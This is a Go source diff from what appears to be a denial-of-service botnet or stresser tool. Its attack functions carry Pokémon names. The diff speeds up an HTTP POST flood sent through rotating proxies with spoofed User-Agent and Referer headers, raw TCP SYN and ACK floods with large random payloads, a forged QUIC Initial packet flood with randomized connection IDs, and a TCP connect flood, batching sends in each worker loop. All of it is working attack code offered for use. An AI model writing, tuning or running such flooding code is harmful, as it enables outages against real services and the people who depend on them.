@@ -400,6 +400,7 @@ func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
 		}
 	}
 
+	bodyBuf := make([]byte, 1024)
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
 		guardedGo("alakazam", func() {
@@ -411,32 +412,33 @@ func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
 				case <-stopCh:
 					return
 				default:
-					var client *http.Client
-					if useProxy {
-						// Get next proxy in rotation (round-robin)
-						proxyAddr := persian()
-						if proxyAddr != "" {
-							var err error
-							client, err = meowstic(proxyAddr, 2*time.Second)
-							if err != nil {
-								continue // Skip to next iteration, try another proxy
+					for j := 0; j < 8; j++ {
+						var client *http.Client
+						if useProxy {
+							// Get next proxy in rotation (round-robin)
+							proxyAddr := persian()
+							if proxyAddr != "" {
+								var err error
+								client, err = meowstic(proxyAddr, 2*time.Second)
+								if err != nil {
+									continue // Skip to next iteration, try another proxy
+								}
+							} else {
+								continue // No proxies available
 							}
 						} else {
-							continue // No proxies available
+							client = sharedClient
 						}
-					} else {
-						client = sharedClient
-					}
-					body := make([]byte, 1024)
-					req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
-					if err != nil {
-						continue
-					}
-					req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
-					req.Header.Set("Referer", referers[rand.Intn(len(referers))])
-					resp, _ := client.Do(req)
-					if resp != nil {
-						resp.Body.Close()
+						req, err := http.NewRequest("POST", targetURL, bytes.NewReader(bodyBuf))
+						if err != nil {
+							continue
+						}
+						req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
+						req.Header.Set("Referer", referers[rand.Intn(len(referers))])
+						resp, _ := client.Do(req)
+						if resp != nil {
+							resp.Body.Close()
+						}
 					}
 				}
 			}
@@ -923,18 +925,25 @@ func dragonite(targetIP string, targetPort, duration int) {
 				return
 			}
 			defer conn.Close()
+			dst := &net.IPAddr{IP: dstIP}
+			buf := make([]byte, 65535-40)
+			rand.Read(buf)
+			var localCount int64
 			for {
 				select {
 				case <-ctx.Done():
+					atomic.AddInt64(&packetCount, localCount)
 					return
 				case <-stopCh:
+					atomic.AddInt64(&packetCount, localCount)
 					return
 				default:
-					hdr := serializeTCP(uint16(rand.Intn(52024)+1024), uint16(targetPort), rand.Uint32(), 0, 0x02, 12800)
-					payload := make([]byte, 65535-40)
-					rand.Read(payload)
-					conn.WriteTo(append(hdr, payload...), &net.IPAddr{IP: dstIP})
-					atomic.AddInt64(&packetCount, 1)
+					for j := 0; j < 32; j++ {
+						hdr := serializeTCP(uint16(rand.Intn(52024)+1024), uint16(targetPort), rand.Uint32(), 0, 0x02, 12800)
+						pkt := append(hdr, buf...)
+						conn.WriteTo(pkt, dst)
+						localCount++
+					}
 				}
 			}
 		})
@@ -975,18 +984,25 @@ func tyranitar(targetIP string, targetPort int, duration int) error {
 				return
 			}
 			defer conn.Close()
+			dst := &net.IPAddr{IP: dstIP}
+			buf := make([]byte, 65535-40)
+			rand.Read(buf)
+			var localCount int64
 			for {
 				select {
 				case <-ctx.Done():
+					atomic.AddInt64(&packetCount, localCount)
 					return
 				case <-stopCh:
+					atomic.AddInt64(&packetCount, localCount)
 					return
 				default:
-					hdr := serializeTCP(uint16(rand.Intn(64312)+1024), uint16(targetPort), rand.Uint32(), rand.Uint32(), 0x10, 12800)
-					payload := make([]byte, 65535-40)
-					rand.Read(payload)
-					conn.WriteTo(append(hdr, payload...), &net.IPAddr{IP: dstIP})
-					atomic.AddInt64(&packetCount, 1)
+					for j := 0; j < 32; j++ {
+						hdr := serializeTCP(uint16(rand.Intn(64312)+1024), uint16(targetPort), rand.Uint32(), rand.Uint32(), 0x10, 12800)
+						pkt := append(hdr, buf...)
+						conn.WriteTo(pkt, dst)
+						localCount++
+					}
 				}
 			}
 		})
@@ -1114,7 +1130,30 @@ func snorlax(targetIP string, targetPort, duration int) {
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
 	var wg sync.WaitGroup
+	const quicHdrLen = 28
 	payload := make([]byte, 8192)
+	// Pre-fill entire buffer with random data (simulates encrypted QUIC payload)
+	rand.Read(payload)
+	// Fixed QUIC v1 Initial header prefix (bytes 0-5: first byte + version)
+	payload[0] = 0xC0
+	payload[1] = 0x00
+	payload[2] = 0x00
+	payload[3] = 0x00
+	payload[4] = 0x01
+	// DCID length = 8
+	payload[5] = 0x08
+	// DCID bytes [6-13]: random (already filled)
+	// SCID length = 8
+	payload[14] = 0x08
+	// SCID bytes [15-22]: random (already filled)
+	// Token length = 0
+	payload[23] = 0x00
+	// Length field (2-byte QUIC varint): covers packet number + remaining payload
+	pktPayloadLen := len(payload) - quicHdrLen
+	payload[24] = byte(0x40 | ((pktPayloadLen >> 8) & 0x3F))
+	payload[25] = byte(pktPayloadLen & 0xFF)
+	// Packet number at byte 26: random (already filled)
+	// Bytes [27..8191]: random encrypted payload (already filled)
 	dst := &net.UDPAddr{IP: dstIP, Port: targetPort}
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
@@ -1125,6 +1164,9 @@ func snorlax(targetIP string, targetPort, duration int) {
 				return
 			}
 			defer conn.Close()
+			// Per-worker copy so DCID/SCID/PktNum can be randomized independently
+			buf := make([]byte, len(payload))
+			copy(buf, payload)
 			for {
 				select {
 				case <-ctx.Done():
@@ -1133,7 +1175,13 @@ func snorlax(targetIP string, targetPort, duration int) {
 					return
 				default:
 					for j := 0; j < 64; j++ {
-						conn.WriteTo(payload, dst)
+						// Randomize DCID (8 bytes at [6-13])
+						binary.LittleEndian.PutUint64(buf[6:14], rand.Uint64())
+						// Randomize SCID (8 bytes at [15-22])
+						binary.LittleEndian.PutUint64(buf[15:23], rand.Uint64())
+						// Randomize packet number (byte 26)
+						buf[26] = byte(rand.Intn(256))
+						conn.WriteTo(buf, dst)
 					}
 				}
 			}
@@ -1162,6 +1210,9 @@ func gengar(targetIP string, targetPort, duration int) {
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
 	var wg sync.WaitGroup
+	addr := dstIP.String() + ":" + strconv.Itoa(targetPort)
+	payloadBytes := []byte(tcpPayload)
+	dialer := net.Dialer{Timeout: 3 * time.Second}
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
 		guardedGo("gengar", func() {
@@ -1173,12 +1224,14 @@ func gengar(targetIP string, targetPort, duration int) {
 				case <-stopCh:
 					return
 				default:
-					conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", dstIP, targetPort))
-					if err != nil {
-						continue
+					for j := 0; j < 16; j++ {
+						conn, err := dialer.Dial("tcp", addr)
+						if err != nil {
+							continue
+						}
+						conn.Write(payloadBytes)
+						conn.Close()
 					}
-					conn.Write([]byte(tcpPayload))
-					conn.Close()
 				}
 			}
 		})
